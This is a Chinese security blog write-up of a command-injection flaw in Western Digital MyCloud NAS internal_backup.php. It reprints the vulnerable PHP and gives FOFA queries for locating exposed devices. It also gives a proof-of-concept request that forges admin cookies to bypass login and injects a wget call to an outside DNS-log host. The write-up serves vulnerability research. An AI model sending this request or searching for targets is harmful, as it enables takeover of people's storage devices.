---
title: "西部数码 NAS internal_backup.php 命令执行漏洞"
source: https://mrxn.net/jswz/west-nas-internal_backup-rce.html
asset_dir: assets/西部数码-nas-internal_backup.php-命令执行漏洞
---

# 西部数码 NAS internal\_backup.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/9/9 12:57
* 739浏览
* [0评论](#comment)
* 34分钟阅读

深入探索

安全工具开发

SQL注入检测工具

安全认证考试


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集中存储和共享解决方案。它允许用户在家中或办公室通过网络访问文件，支持多种设备的备份和共享。Western Digital MyCloud NAS internal\_backup.php中存在[命令执行](https://mrxn.net/tag/rce)漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。

漏洞扫描服务

# 影响版本

<=2.11.153（老版本，已发布修复补丁）

# fofa语法

> icon\_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"
>
> body="\_PROJECT\_MODEL\_ID\_YOSEMITE " && body="\_PROJECT\_MODEL\_ID\_LIGHTNING "

# 漏洞分析

直接看 `internal_backup.php` 其业务实现逻辑如下

```
<?php
session_start();
$r = new stdClass();
$r->success = false;

include ("../lib/login_checker.php");

/* login_check() return 0: no login, 1: login, admin, 2: login, normal user */
if (login_check() != 1)
{
    echo json_encode($r);
    exit;
}

define('INTERNAL_BACKUPS_CONF', '/var/www/xml/internal_backup.xml');

$action = $_POST['action'];
if ($action == "")  $action = $_GET['action'];
.....
switch ($action)
{
    case "create":
    {
       $taskname = $_POST['taskname'];       
       $source_dir = $_POST['source_dir'];
       $dest_dir = $_POST['dest_dir'];
       $backup_type = $_POST['backup_type'];

       $schedule = $_POST['schedule'];
       $schedule_type = $_POST['backup_sch_type'];
       $hour = $_POST['hour'];
       $week = $_POST['week'];
       $day = $_POST['day'];

       $sch_command = "";
       if ($schedule  == "0")$sch_command = "0,1,1";
       else if ($schedule_type  == "3")$sch_command = "3,1,".$hour; //daily
       else if ($schedule_type  == "2")$sch_command = "2,".$week.",".$hour; //weekly
       else if ($schedule_type  == "1")$sch_command = "1,".$day.",".$hour; //monthly

       $cmd = sprintf("internal_backup -a \"%s\" -m %s -d %s -r %s -c jobadd",
                   $taskname, $backup_type, escapeshellarg(htmlstr_decode($dest_dir)), $sch_command);

       foreach ($source_dir as $val)
          $cmd .= sprintf(" -s %s", escapeshellarg(htmlstr_decode($val)));

           $cmd .= " >/dev/null 2>&1";

       /*
       $file = '/tmp/cgi_internalbackup.txt';
       // Open the file to get existing content
       $current = file_get_contents($file);
       // Append a new person to the file
       $current .= $cmd;
       // Write the contents back to the file
       file_put_contents($file, $current);
       */

       system($cmd);
       //pclose(popen($cmd, 'r'));
       $pname = sprintf("/tmp/r_internal!_%s", $taskname);
       //@unlink($pname);
       system("rm ".$pname);

       stop_job($taskname);

       //Start job
       $cmd = sprintf("(internal_backup -a '%s' -c jobrun >/dev/null 2>&1)&", $taskname);
       system($cmd);
             //pclose(popen($cmd, 'r'));
       //sleep(2);

       $r = get_list();
       $r->success = true;       
       echo json_encode($r);
    }
```

当`$_POST['action']` = `create`时，`$taskname = $_POST['taskname']`、`$_POST['backup_type']`、`$_POST['source_dir']`这几个参数均是直接拼接进$cmd中，然后调用**system**进行执行，期间对这几个参数没有过滤或校验，导致了[命令注入](https://mrxn.net/tag/rce)漏洞。尽管此漏洞需要管理员权限才能触发，但可以结合`login_check`的权限绕过达到 RCE的效果。

漏洞扫描服务

类似的问题同样存在于`modify` `go_restore` `go_jobs` `del` 操作中，其中`$backup_type` `$restore_source` `$taskname` `$old_taskname`等参数也未被转义。

[![西部数码 NAS internal_backup.php 命令执行漏洞](images/img-001-f097186fc886.webp)](https://image.mrxn.net/51282b8190714f64bcfc2d3f10d9564a.webp)

go\_restore

[![西部数码 NAS internal_backup.php 命令执行漏洞](images/img-002-5efe021b3d9b.webp)](https://image.mrxn.net/f791fd3909c34bca8a31d802186bdbbc.webp)

go\_jobs

[![西部数码 NAS internal_backup.php 命令执行漏洞](images/img-003-d3aae7c7547e.webp)](https://image.mrxn.net/76000b20f71e4ebe95131364435f7159.webp)

del

[![西部数码 NAS internal_backup.php 命令执行漏洞](images/img-004-6c6fcbc50210.webp)](https://image.mrxn.net/f08e6833ed184b7ebeba2ef02c615dde.webp)

# 漏洞复现

> 需要注意source\_dir应为数组形式，否则foreach循环判断会出错
>
> 漏洞扫描服务

```
POST /web/backups/internal_backup.php HTTP/1.1
Host: west-nas.mrxn.ent
Cookie: isAdmin=1;username=admin
Content-Type: application/x-www-form-urlencoded

taskname=";wget xx.dnslog.pt;"&action=create&source_dir[]=
```

[![西部数码 NAS internal_backup.php 命令执行漏洞](images/img-005-9b6f53a81631.webp)](https://image.mrxn.net/3230b12ab3a844c5b567ff69aec5dcc4.webp)

成功在DNSLOG平台收到DNS和HTTP请求

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#php](https://mrxn.net/tag/php)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[西部数码 NAS internal\_backup.php 命令执行漏洞](https://mrxn.net/jswz/west-nas-internal_backup-rce.html)  
文章链接：<https://mrxn.net/jswz/west-nas-internal_backup-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

文件大小转换

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/west-nas-internal\_backup-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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